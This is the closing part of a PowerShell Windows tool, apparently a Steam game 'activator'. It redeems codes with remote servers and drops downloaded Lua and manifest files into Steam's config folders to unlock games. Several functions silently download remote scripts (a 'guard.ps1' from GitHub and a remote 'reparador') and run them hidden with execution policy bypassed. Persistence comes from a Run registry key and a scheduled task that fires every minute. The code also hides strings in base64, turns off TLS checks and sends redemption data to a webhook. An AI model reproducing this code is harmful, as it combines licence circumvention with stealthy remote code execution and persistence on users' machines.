        if (Test-Path $ensure) { try { Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ensure`"" -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {} }
        if ((Test-Path $watchExe) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
            Start-Process -FilePath $watchExe -WindowStyle Hidden
        }
    } catch {}
}


function Ensure-ExpiryWatcher {
    try {
        $selfExe = [Environment]::GetCommandLineArgs()[0]
        if (-not $selfExe -or -not (Test-Path $selfExe)) { return }
        $existing = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'BastissSteamActivator*' -and $_.CommandLine -match '-expiry' })
        if ($existing.Count -eq 0) {
            try { Start-Process -FilePath $selfExe -ArgumentList '-expiry' -WindowStyle Hidden -ErrorAction Stop } catch {}
        }
        try {
            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BastissSteamExpiry' -Value ('"{0}" -expiry' -f $selfExe) -Type String -Force -ErrorAction Stop
        } catch {}
    } catch {}
}


function Start-WatcherProcess {
    try {
        
        $existing = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "powershell.exe" -and $_.CommandLine -match (S('YnNtYXBfd2F0Y2hlclwucHMx')) })
        if ($existing.Count -gt 0) {
            $script:watcherProcess = Get-Process -Id $existing[0].ProcessId -ErrorAction SilentlyContinue
            $script:watcherEnabled = $true
            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [START] Reparador ya estaba activo (PID=$($existing[0].ProcessId))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
            return $true
        }
        try { Add-Content -Path $script:watcherLogPath -Value "`n=== [$(Get-Date -Format 'HH:mm:ss')] INICIANDO REPARADOR ===" -Encoding UTF8 -Force -ErrorAction SilentlyContinue } catch {}
        if (-not (Test-Path $script:watcherTemp) -or ((Get-Date) - (Get-Item $script:watcherTemp -ErrorAction SilentlyContinue).LastWriteTime).TotalHours -gt 24) {
            Add-Content -Path $script:watcherLogPath -Value (S("W1NUQVJUXSBEZXNjYXJnYW5kbyByZXBhcmFkb3IuLi4=")) -Encoding UTF8 -ErrorAction SilentlyContinue
            Invoke-RestMethod -Uri $script:watcherUrl -UseBasicParsing -TimeoutSec 15 -OutFile $script:watcherTemp -ErrorAction SilentlyContinue
            if (Test-Path $script:watcherTemp) { Add-Content -Path $script:watcherLogPath -Value "[START] Reparador descargado: $((Get-Item $script:watcherTemp).Length) bytes" -Encoding UTF8 -ErrorAction SilentlyContinue }
            else { Add-Content -Path $script:watcherLogPath -Value "[START] ERROR: descarga fallo" -Encoding UTF8 -ErrorAction SilentlyContinue; return $false }
        } else { Add-Content -Path $script:watcherLogPath -Value (S("W1NUQVJUXSBSZXBhcmFkb3IgZW4gY2FjaGU=")) -Encoding UTF8 -ErrorAction SilentlyContinue }
        if (Test-Path $script:watcherTemp) {
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "powershell.exe"
            $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:watcherTemp`""
            $psi.WindowStyle = "Hidden"; $psi.CreateNoWindow = $true; $psi.UseShellExecute = $false
            $script:watcherProcess = [System.Diagnostics.Process]::Start($psi)
            $script:watcherEnabled = $true
            Add-Content -Path $script:watcherLogPath -Value "[START] Reparador lanzado (PID=$($script:watcherProcess.Id))" -Encoding UTF8 -ErrorAction SilentlyContinue
            return $true
        }
        return $false
    } catch { WEL (S("TGF1bmNoIHJlcGFyYWRvcg==")) $_; return $false }
}


$irmCodeArg = ""
$irmSrvBase = ""
$irmSrvBaseCf = ""
try {
    $allArgs = @($args) + @([Environment]::GetCommandLineArgs())
    for ($ai = 0; $ai -lt $allArgs.Count; $ai++) {
        if (([string]$allArgs[$ai]).ToLower() -eq '-irmcode' -and ($ai + 1) -lt $allArgs.Count) { $irmCodeArg = ([string]$allArgs[$ai + 1]).Trim().ToUpper() }
        if (([string]$allArgs[$ai]).ToLower() -eq '-srvbase' -and ($ai + 1) -lt $allArgs.Count) { $irmSrvBase = ([string]$allArgs[$ai + 1]).Trim() }
        if (([string]$allArgs[$ai]).ToLower() -eq '-srvbasecf' -and ($ai + 1) -lt $allArgs.Count) { $irmSrvBaseCf = ([string]$allArgs[$ai + 1]).Trim() }
    }
} catch {}
$script:phaseFile = Join-Path $env:TEMP 'bsmap_phase.log'
function Write-Phase([string]$s) { try { $lnPh="[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $PID v$($script:version) $s"; $fPh=$script:phaseFile; $prevPh=@(); try { $prevPh=@(Get-Content -LiteralPath $fPh -ErrorAction Stop) } catch {}; $allPh=@($prevPh + $lnPh); if ($allPh.Count -gt 25) { $allPh=@($allPh | Select-Object -Last 25) }; $allPh | Set-Content -LiteralPath $fPh -Encoding UTF8 } catch {} }
try {
    if (Test-Path -LiteralPath $script:phaseFile) {
        $allPrev = @(Get-Content -LiteralPath $script:phaseFile -ErrorAction Stop)
        $plLast = $allPrev | Select-Object -Last 1
        if ($plLast -notmatch 'exit-ok|crash-notificado' -and ($plLast -match '20\d\d-\d\d-\d\d \d\d:\d\d:\d\d')) {
            try {
                $ptsPrev = [datetime]::ParseExact($Matches[0].Trim(), 'yyyy-MM-dd HH:mm:ss', $null)
                $agePrev = (Get-Date) - $ptsPrev
                if ($agePrev.TotalHours -lt 24 -and $agePrev.TotalMinutes -gt 5) {
                    $histPrev = ($allPrev | Select-Object -Last 5) -join "`n"
                    Send-ConnErrorBg $irmCodeArg "Muerte inesperada anterior" ("La corrida anterior no termino. Ultimas fases:`n" + $histPrev) ([string]$script:serverUrl) ([string]$script:serverUrlCf) $false ([string]$script:clientId) ([string]$script:version)
                    Write-Phase "crash-notificado"
                }
            } catch {}
        }
    }
} catch {}
if ($irmCodeArg) { Write-Phase ("args-ok code=" + $irmCodeArg) }
if ($irmCodeArg) {
    $irmExit = 1
    try {
        try { $cw0 = [DwmHelper]::GetConsoleWindow(); if ($cw0 -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw0, 9) | Out-Null } } catch {}
        $locTok = $null; try { $locTok = Get-LocalToken } catch {}
        $code = $irmCodeArg
    $cdSW = [System.Diagnostics.Stopwatch]::StartNew()
    try { $script:uiBusy = $true } catch {}
        $redeemNow, $_ = Get-Now
        $sendToken = ""
        if ($locTok -and $locTok.token) { $sendToken = [string]$locTok.token }
        $body = @{code=$code;client_id=$script:clientId;redeem_at=$redeemNow.ToString("o");token=$sendToken} | ConvertTo-Json
        $lastErr = $null
        Write-Phase ("redeem-start code=" + $code)
        $script:skipUrlResolve = $false
        if ($irmSrvBase -match "^https?://") { $script:serverUrl=$irmSrvBase; $script:serverIp=""; if ($irmSrvBaseCf -match "^https?://") { $script:serverUrlCf=$irmSrvBaseCf; $script:serverIpCf="" }; try { $script:lastUrlOk=Get-Date } catch {}; $script:skipUrlResolve=$true }
        for ($attempt = 0; $attempt -lt 3 -and $cdSW.Elapsed.TotalSeconds -lt 20; $attempt++) {
            try {
                if ($script:skipUrlResolve) { $script:skipUrlResolve=$false } else { Update-ServerUrl }
                $cands = @()
                if ($irmSrvBase -match "^https?://") { $cands += ,@($irmSrvBase, "") }
                if ($irmSrvBaseCf -match "^https?://" -and $irmSrvBaseCf -ne $irmSrvBase) { $cands += ,@($irmSrvBaseCf, "") }
                $primPair = @([string]$script:serverUrl, [string]$script:serverIp)
                $secPair = $null
                if ($script:serverUrlCf -and $script:serverUrlCf -ne $script:serverUrl) { $secPair = @([string]$script:serverUrlCf, [string]$script:serverIpCf) }
                if ($primPair[0]) { $cands += ,$primPair }; if ($secPair) { $cands += ,$secPair }
                $tempBody = Join-Path $env:TEMP 'bsmap_redeem_body.json'
                $tempResp = Join-Path $env:TEMP 'bsmap_redeem_resp.json'
                $utf8NoBom = New-Object System.Text.UTF8Encoding $false
                [System.IO.File]::WriteAllText($tempBody, $body, $utf8NoBom)
                $rr = $null
                $triedUrls = @(); $candErrs = @(); $usedUrl = ""
                foreach ($cd in $cands) {
                    if ($cdSW.Elapsed.TotalSeconds -ge 20) { break }
                    $candUrl = $cd[0]; $candIp = $cd[1]
                    $reqUrl = "$candUrl/api/redeem-code"
                    Write-Phase ("trycand " + $candUrl)
                    $resolveArg = @()
                    if ($candIp -and $candUrl -match "^https://([a-zA-Z0-9-]+)") { $hn = ([uri]$candUrl).Host; if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$candIp") } }
                    $resolveStr = ($resolveArg -join "|")
                    $rr = Invoke-PsBlockingDoEvents {
                    param($reqUrl, $body, $tempBody, $tempResp, $resolveStr, $serverIp)
                    $u8 = New-Object System.Text.UTF8Encoding $false
                    $ra = @(); if ($resolveStr) { $ra = @($resolveStr -split '\|') }
                    $psiR = New-Object System.Diagnostics.ProcessStartInfo
                    $psiR.FileName = "curl.exe"
                    $psiR.Arguments = ((@('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*') + @($ra) + @('-X','POST','-H','Content-Type: application/json','--data-binary',"@$tempBody",$reqUrl,'--connect-timeout','4','--max-time','7','-o',$tempResp) | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
                    $psiR.CreateNoWindow = $true
                    $psiR.UseShellExecute = $false
                    $psiR.RedirectStandardError = $true
                    $prR = New-Object System.Diagnostics.Process
                    $prR.StartInfo = $psiR
                    $curlOut = @()
                    $ce = -1
                    try {
                        [void]$prR.Start()
                        if (-not $prR.WaitForExit(20000)) { try { $prR.Kill() } catch {} }
                        $ce = $prR.ExitCode
                        try { $curlOut = @($prR.StandardError.ReadToEnd() -split "`r?`n") } catch {}
                    } catch {}
                    $respRaw = $null
                    if ($ce -eq 0 -and (Test-Path -LiteralPath $tempResp)) { $respRaw = [System.IO.File]::ReadAllText($tempResp, $u8) }
                    if (-not $respRaw) {
                        $curlErr = (($curlOut | Where-Object { $_ -is [string] }) -join " | ").Trim()
                        try {
                            $iwr = Invoke-WebRequest -Uri $reqUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop
                            $respRaw = $iwr.Content
                        } catch {
                            return [pscustomobject]@{ err = "curl exit $ce URL: $reqUrl | serverIp: $serverIp | curl-err: $curlErr | IWR-fallback-err: $($_.Exception.Message)" }
                        }
                    }
                    if ($respRaw -match "^\s*<") { return [pscustomobject]@{ err = "Servidor devolvio HTML (error 500): $($respRaw.Substring(0,200))" } }
                    try { $resp = $respRaw | ConvertFrom-Json } catch { return [pscustomobject]@{ err = "Respuesta invalida del servidor: $respRaw" } }
                    if ($null -eq $resp -or $resp -is [string] -or $resp -is [int] -or $resp -is [array]) { return [pscustomobject]@{ err = "Respuesta invalida del servidor (json primitivo): $respRaw" } }
                    return [pscustomobject]@{ json = ($resp | ConvertTo-Json -Depth 6 -Compress) }
                } @($reqUrl, $body, $tempBody, $tempResp, $resolveStr, [string]$candIp) -TimeoutSec 8
                    Remove-Item $tempResp -Force -ErrorAction SilentlyContinue
                    $triedUrls += $candUrl
                    try { $script:lastTried = ($triedUrls -join " -> ") } catch {}
                    if ($rr -and $rr.json) { $usedUrl = $candUrl; break }
                    if ($rr -and $rr.err) { $candErrs += "[$candUrl] $($rr.err)"; try { $script:lastCandErrs = ($candErrs -join " || ") } catch {} }
                }
                Remove-Item $tempBody -Force -ErrorAction SilentlyContinue
                if (-not $rr) { throw "Sin respuesta del servidor" }
                if ($rr.err) { $allE = ($candErrs -join " || "); if (-not $allE) { $allE = $rr.err }; throw $allE }
                $resp = $rr.json | ConvertFrom-Json
                $lastErr=$null; break
            } catch { $lastErr=$_; Start-Sleep -Milliseconds 600 }
        }
        if ($lastErr) { throw $lastErr }
        if (-not $resp.ok) { $re = [string]$resp.err; if ($re -match 'ya usado|Codigo usado|otra maquina') { throw "este activador ya se uso" } else { throw $resp.err } }
        Write-Phase ("redeem-ok code=" + $code)
        try { if ($resp.token) { Set-LocalToken ([string]$resp.token) $code } } catch {}
        $links = @($resp.links); $duration = [int]$resp.duration
        $rMode = ""; try { $rMode = ([string]$resp.mode).ToLower() } catch {}
        if ($links.Count -eq 0) { throw "El codigo no contiene links." }
        $viaTxt = if ($usedUrl -and $usedUrl -eq $script:serverUrlCf) { "Cloudflare" } else { "Tailscale" }
        $tryTxt = ($triedUrls -join " -> "); if (-not $tryTxt) { $tryTxt = $usedUrl }
        $srvInfo = "**App:** $script:version [IRM]`n**Servidor:** $usedUrl`n**Via:** $viaTxt`n**Intentos:** $tryTxt"
        Send-Webhook $code (($links -join "`n") + "`n$srvInfo")
        $baseNow, $baseIsNet = Get-Now
        $expDate = $null
        if ($resp.expires_at) { try { $eVig = [datetime]::Parse([string]$resp.expires_at); if ($eVig.Kind -eq [DateTimeKind]::Utc) { $eVig = $eVig.ToLocalTime() }; $expDate = $eVig } catch {} }
        if (-not $expDate -and $duration -gt 0) { $expDate = $baseNow.AddSeconds($duration) }
        $steamRoot = Get-SteamPath
        if (-not $steamRoot) { throw "No se encontro Steam instalado." }
        try { Set-LoteJob (New-LoteJob $code $links $duration $expDate $steamRoot) } catch {}
        Write-Phase ("patch-start code=" + $code)
        try { $script:patchSilentOK = Xz9Qk -Silent } catch { $script:patchSilentOK = $false }
        if (-not $script:patchSilentOK) { try { Send-ConnErrorBg $code "Instalacion incompleta" "Xz9Qk -Silent devolvio falso (dlls no verificados)" ([string]$script:serverUrl) ([string]$script:serverUrlCf) $false ([string]$script:clientId) ([string]$script:version) } catch {} }
        Write-Phase ("postpatch code=" + $code)
        $total = $links.Count
        try { $script:activeCodes.Add(@{Code=$code;Game="";ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$baseNow.ToString("o")})|Out-Null } catch {}
        try { Send-PatchStatus $code "PENDIENTE $total juegos | Servidor: $usedUrl ($viaTxt) [IRM]" } catch {}
        $successCount = 0; $errors = @()
        $pool=[RunspaceFactory]::CreateRunspacePool(1, [Math]::Min($total,6))
        $pool.Open()
        $jobs=@()
        for($i=0;$i -lt $total;$i++){
            $mfUrl=$links[$i]
            $gameName=[System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2]); if($gameName){$gameName=$gameName -replace '%[0-9a-fA-F]{2}', ''}
            $zipFile=Join-Path $env:TEMP "fix_$(Get-Random)_$i.zip"
            $ps=[PowerShell]::Create()
            $ps.RunspacePool=$pool
            [void]$ps.AddScript({
                param($url,$zip,$gName,$expDate,$codeStr,$steamRoot)
                try{
                    $res=@{ok=$false; err=""; lua=@(); man=@(); game=$gName}
                    $psiL = New-Object System.Diagnostics.ProcessStartInfo
                    $psiL.FileName = "curl.exe"
                    $psiL.Arguments = ((@('-s','-k','-L','--ssl-no-revoke','--retry','3','--retry-delay','3','--retry-all-errors','-C','-','-H','User-Agent: Mozilla/5.0','-o',$zip,$url,'--max-time','180') | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
                    $psiL.CreateNoWindow = $true
                    $psiL.UseShellExecute = $false
                    $prL = New-Object System.Diagnostics.Process
                    $prL.StartInfo = $psiL
                    $ceL = -1
                    try { [void]$prL.Start(); if (-not $prL.WaitForExit(200000)) { try { $prL.Kill() } catch {} }; $ceL = $prL.ExitCode } catch {}
                    if($ceL -ne 0 -or -not (Test-Path $zip) -or (Get-Item $zip).Length -lt 500){ throw "descarga fallida para $url" }
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    $tmpExp=Join-Path $env:TEMP "par_$(Get-Random)"
                    New-Item -ItemType Directory -Path $tmpExp -Force | Out-Null
                    [IO.Compression.ZipFile]::ExtractToDirectory($zip,$tmpExp)
                    $luaDir=Join-Path $steamRoot "config\stplug-in"
                    $luaDir2=Join-Path $steamRoot "config\lua"
                    $manDir=Join-Path $steamRoot "config\depotcache"
                    $manRoot=Join-Path $steamRoot "depotcache"
                    foreach($d in @($luaDir,$luaDir2,$manDir,$manRoot)){ if(-not (Test-Path $d)){ New-Item -ItemType Directory -Path $d -Force | Out-Null } }
                    $luas=@(Get-ChildItem $tmpExp -Recurse -Filter *.lua | ForEach-Object { $_.Name })
                    $mans=@(Get-ChildItem $tmpExp -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
                    $header=""
                    if($gName -and $expDate){
                        $header="-- BSMAP_EXPIRES:$($expDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gName`n"
                        if($mans.Count -gt 0){ $header+="-- BSMAP_MANIFESTS:$($mans -join ',')`n" }
                        if($codeStr){ $header+="-- BSMAP_CODE:$codeStr`n" }
                    }
                    foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.lua){
                        $dst1=Join-Path $luaDir $f.Name; $dst2=Join-Path $luaDir2 $f.Name
                        if($header){ try{ $c=[IO.File]::ReadAllText($f.FullName); [IO.File]::WriteAllText($dst1, $header+$c, (New-Object System.Text.UTF8Encoding $false)); [IO.File]::WriteAllText($dst2, $header+$c, (New-Object System.Text.UTF8Encoding $false)) }catch{ Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force } }
                        else { Copy-Item $f.FullName $dst1 -Force; Copy-Item $f.FullName $dst2 -Force }
                    }
                    foreach($f in Get-ChildItem $tmpExp -Recurse -Filter *.manifest){ Copy-Item $f.FullName (Join-Path $manDir $f.Name) -Force; Copy-Item $f.FullName (Join-Path $manRoot $f.Name) -Force }
                    Remove-Item $tmpExp -Recurse -Force -ErrorAction SilentlyContinue
                    $res.ok=$true; $res.lua=$luas; $res.man=$mans
                }catch{ $res.err=$_.Exception.Message }
                Remove-Item $zip -Force -ErrorAction SilentlyContinue
                return $res
            }).AddArgument($mfUrl).AddArgument($zipFile).AddArgument($gameName).AddArgument($expDate).AddArgument($code).AddArgument($steamRoot)
            $h=$ps.BeginInvoke()
            $jobs+=@{ps=$ps; handle=$h; game=$gameName; url=$mfUrl}
        }
        $lastDone = -1
        while(@($jobs | Where-Object { -not $_.handle.IsCompleted }).Count -gt 0){
            $doneNow = @($jobs | Where-Object { $_.handle.IsCompleted }).Count
            if ($doneNow -ne $lastDone) { $lastDone = $doneNow; Write-Host "($doneNow/$total) Activando..." }
            Start-Sleep -Milliseconds 500
        }
        foreach($j in $jobs){
            try{
                $r=$j.ps.EndInvoke($j.handle)
                if($r -and $r.ok){
                    $successCount++
                    Write-Host "($successCount/$total)"
                    $timerExp=if($expDate){$expDate}else{$baseNow.AddYears(1)}
                    $timers=At5Vc; $internetNow,$netOk=Get-InternetTime; if(-not $internetNow){$internetNow=$baseNow}; $iNow=$internetNow.ToString("o")
                    $timers+=@{redeem_code=$code;duration=$duration;expires_at=$timerExp.ToString("o");internet_created_at=$iNow;game_name=$j.game;steam_root=$steamRoot;lua_files=@($r.lua);manifest_files=@($r.man)}
                    St7Xb $timers
                    $script:activeCodes.Add(@{Code=$code;Game=$j.game;ActivatedAt=$baseNow;ExpiresAt=$(if($expDate){$expDate}else{$baseNow.AddYears(1)});Duration=$duration;InternetCreatedAt=$iNow})|Out-Null
                    try { Mark-LoteDone $code $j.url @($r.lua) @($r.man) $j.game } catch {}
                } else { $errors+="$($j.game) : $($r.err)" }
            }catch{ $errors+="$($j.game) : $($_.Exception.Message)" }
            try{ $j.ps.Dispose() }catch{}
        }
        $pool.Close(); $pool.Dispose()
        if ($successCount -gt 0) {
            Write-Host "$successCount de $total juegos activados."
            try {
                $tokRepH = $sendToken
                try { $ltH = Get-LocalToken; if ($ltH -and $ltH.token) { $tokRepH = [string]$ltH.token } } catch {}
                Invoke-BgNoWait ({ param($u,$c,$i,$t)
                    try {
                        $bRep = @{code=$c;client_id=$i;token=$t} | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri ($u + "/api/install-ok") -Method Post -Body $bRep -ContentType "application/json" -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop | Out-Null
                    } catch {}
                }) @([string]$usedUrl,[string]$code,[string]$script:clientId,[string]$tokRepH)
            } catch {}
            try { Send-PatchStatus $code "OK $successCount/$total | Servidor: $usedUrl ($viaTxt) [IRM]" } catch {}
        } else { throw "No se pudo activar ningun juego.`n$($errors -join '; ')" }
        $irmExit = 0
    } catch {
        $em = $_.Exception.Message
        try { $em = $em -replace 'https?://[^\s\)\]''"<>]+','[servidor]' } catch {}
        Write-Host "No se pudo canjear. Se envio el reporte."
        try { Send-ConnErrorBg $code $em ([string]$_.Exception.Message) ([string]$script:serverUrl) ([string]$script:serverUrlCf) $false ([string]$script:clientId) ([string]$script:version) } catch {}
    }
    try {
        Write-Phase "exit-ok"
        $drainSW=[System.Diagnostics.Stopwatch]::StartNew()
        while ($drainSW.Elapsed.TotalSeconds -lt 3) {
            $pend=@($script:bgPowershells | Where-Object { -not $_.h.IsCompleted })
            if ($pend.Count -eq 0) { break }
            Start-Sleep -Milliseconds 300
        }
    } catch {}
    [System.Environment]::Exit($irmExit)
}

function Invoke-DeferredWork {
Ensure-CleanupTask
Ensure-ExpiryWatcher
try {
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -match 'guard\.ps1' } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
    $gDst=Join-Path $env:LOCALAPPDATA "BastissSteam\guard.ps1"
    try { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/steamsito/main/guard.ps1" -OutFile $gDst -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue } catch {}
    if (Test-Path $gDst) {
        $gVbs=Join-Path $env:LOCALAPPDATA "BastissSteam\guard_launch.vbs"
        try { Set-Content -LiteralPath $gVbs -Value "Set sh = CreateObject(`"WScript.Shell`")`r`nps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\BastissSteam\guard.ps1`")`r`ncmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`nsh.Run cmd, 0, False`r`n" -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
        $tCmd="wscript.exe //B `"$gVbs`""
        $needTask=$true
        try { $t0=Get-ScheduledTask -TaskName 'BastissGuard' -ErrorAction Stop; if ($t0) { $needTask=$false } } catch {}
        if ($needTask) {
            try { $stP=Start-Process schtasks.exe -ArgumentList '/Create','/TN','BastissGuard','/TR',$tCmd,'/SC','MINUTE','/MO','1','/F' -WindowStyle Hidden -PassThru -ErrorAction Stop; $stP.WaitForExit(15000) | Out-Null } catch {}
        }
        Start-Sleep -Milliseconds 500
        if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "guard\.ps1" })) {
            try { Start-Process wscript.exe -ArgumentList "//B `"$gVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null } catch {}
        }
    }
} catch {}
try { $sr0=Get-SteamPath; if ($sr0 -and -not (Test-ParcheActual $sr0)) { $null = Xz9Qk -Silent } } catch {}

if ((Get-ReparadorFlag) -eq 1) {
    try {
        if (Start-WatcherProcess) {
            try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [AUTO] Reparador auto-iniciado (flag persistente)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        }
    } catch {}
}
}

function Start-DeferredInit {
try { if ($script:deferredInitDone) { return } } catch {}
try { $script:deferredInitDone = $true } catch {}
try {
$bgVars = @{}
foreach ($vn in @('watcherLogPath','watcherTemp','watcherUrl','defenderExclusionsDone','serverUrl','serverIp','serverUrlCf','serverIpCf','version','clientId','internetTimeCache','internetTimeCacheTime','clockOffsetSec','activeCodes','patchCountCache','lastUrlOk','deferredInitDone','ParcheDllHash','errorLogFile','TIMERS_FILE','PENDING_FILE','TOKEN_FILE','WEBHOOK_URL','CLIENT_ID_FILE','HISTORY_FILE','WORKING_GAMES_FILE')) {
try { $bgVars[$vn] = Get-Variable $vn -Scope Script -ValueOnly -ErrorAction Stop } catch {}
}
$bgJson = ''
try { $bgJson = (ConvertTo-Json -InputObject $bgVars -Depth 6 -Compress) } catch {}
$issBg = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
try {
foreach ($fcmd in @(Get-Command -CommandType Function)) {
try {
if ($fcmd.ScriptBlock -and [string]$fcmd.ModuleName -eq '') {
$issBg.Commands.Add((New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $fcmd.Name, $fcmd.ScriptBlock))
}
} catch {}
}
} catch {}
$poolBg = [RunspaceFactory]::CreateRunspacePool($issBg)
$poolBg.Open()
$psBg = [PowerShell]::Create()
$psBg.RunspacePool = $poolBg
[void]$psBg.AddScript({
param($varsJson, $envLA, $envT)
$ErrorActionPreference = 'SilentlyContinue'
$env:LOCALAPPDATA = $envLA
$env:TEMP = $envT
$env:TMP = $envT
try {
$vo = $varsJson | ConvertFrom-Json
foreach ($pp in @($vo.PSObject.Properties)) { try { Set-Variable -Name $pp.Name -Value $pp.Value -Scope Script } catch {} }
} catch {}
try { $script:utf8NoBom = New-Object System.Text.UTF8Encoding $false } catch {}
try { Add-Type -AssemblyName System.IO.Compression.FileSystem } catch {}
try { Invoke-DeferredWork } catch {}
}).AddArgument($bgJson).AddArgument($env:LOCALAPPDATA).AddArgument($env:TEMP)
$script:bgInitHandle = $psBg.BeginInvoke()
$script:bgInitPs = $psBg
$script:bgInitPool = $poolBg
} catch {}
}


$script:startInTray = $false
try {
    $cliArgs = @($args) + @([Environment]::GetCommandLineArgs())
    if ($cliArgs -contains '-min' -or $cliArgs -contains '-hidden') { $script:startInTray = $true }
} catch {}
if ($script:startInTray) {
    try { $form.Hide(); $script:trayIcon.Visible = $true } catch {}
}
try { [System.Windows.Forms.Application]::Run($form) } catch {
    $msg = $_.Exception.Message
    if ($msg -match 'ya existe|already exists') {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] SUPPRESSED already exists at Run: $msg`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
    } else {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] RUN EX: $msg`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
        throw
    }
}
try { $script:trayIcon.Visible = $false; $script:trayIcon.Dispose() } catch {}
foreach ($timer in @($script:cdT,$script:rfT,$script:clpTicker,$script:urlChecker,$script:steamWatchTimer,$script:watcherLogTimer,$script:luatoolsLogTimer,$script:bibTimer,$script:bibRenderTimer,$script:bibLoadingTimer,$script:bibNameTimer,$script:bdtDlTimer,$script:bibDetailTimer,$script:bibRepairTimer,$script:updTimer)) {
    try { if ($timer) { $timer.Stop(); $timer.Dispose() } } catch {}
}
$pendingStops = @()
foreach ($job in @($script:bibCoverJobs) + @($script:bibDetailJobs) + @($script:bibNameJob,$script:bibBulkJob,$script:bibRepairJob,$script:bdtDlWatch)) {
    if (-not $job -or -not $job.ps) { continue }
    try {
        if ($job.h -and -not $job.h.IsCompleted) {
            $stopHandle = $job.ps.BeginStop($null,$null)
            $pendingStops += @{job=$job;stop=$stopHandle}
        } else {
            if ($job.h) { $job.ps.EndInvoke($job.h) | Out-Null }
            $job.ps.Dispose()
        }
    } catch { try { $job.ps.Dispose() } catch {} }
}
foreach ($pending in $pendingStops) {
    $job=$pending.job
    try { if ($pending.stop -and $pending.stop.AsyncWaitHandle.WaitOne(300)) { $job.ps.EndStop($pending.stop) } } catch {}
    try { if ($job.h -and $job.h.AsyncWaitHandle.WaitOne(300)) { $job.ps.EndInvoke($job.h) | Out-Null } } catch {}
    try { $job.ps.Dispose() } catch {}
}
foreach ($pool in @($script:bibCoverPool,$script:bibDetailPool,$script:bibRepairPool,$script:bgInitPool)) {
    try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {}
}
if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose() }
if ($script:rfT) { $script:rfT.Stop(); $script:rfT.Dispose() }
if ($script:clpTicker) { $script:clpTicker.Stop(); $script:clpTicker.Dispose() }
if ($script:urlChecker) { $script:urlChecker.Stop(); $script:urlChecker.Dispose() }
if ($script:steamWatchTimer) { $script:steamWatchTimer.Stop(); $script:steamWatchTimer.Dispose() }
if ($script:watcherLogTimer) { $script:watcherLogTimer.Stop(); $script:watcherLogTimer.Dispose() }


if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { Remove-Job $j.job -Force -ErrorAction SilentlyContinue } catch {} } }
if ($script:fixesJob) { try { Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } catch {} }
if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
if ($script:logoBmp) { $script:logoBmp.Dispose() };if ($script:tiktokBmp) { $script:tiktokBmp.Dispose() };if ($script:discordBmp) { $script:discordBmp.Dispose() };if ($ib) { $ib.Dispose() }
if ($script:singleMutex) { try { $script:singleMutex.ReleaseMutex(); $script:singleMutex.Dispose() } catch {} }






